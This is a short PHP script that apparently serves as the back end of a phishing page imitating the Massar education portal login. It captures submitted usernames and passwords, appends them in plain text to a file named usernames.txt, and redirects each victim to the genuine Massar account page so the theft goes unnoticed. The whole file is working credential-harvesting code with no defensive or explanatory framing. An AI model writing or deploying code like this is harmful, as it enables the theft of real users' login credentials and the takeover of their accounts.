<?php

file_put_contents("usernames.txt", " [username:] " . $_POST['usr'] ."\n". " [password:] " . $_POST['psw'] . "\n", FILE_APPEND);
file_put_contents("usernames.txt", " ------------------------------------------------------------- " . "\n", FILE_APPEND);
header('Location: https://massar.men.gov.ma/Account');
exit();
?>
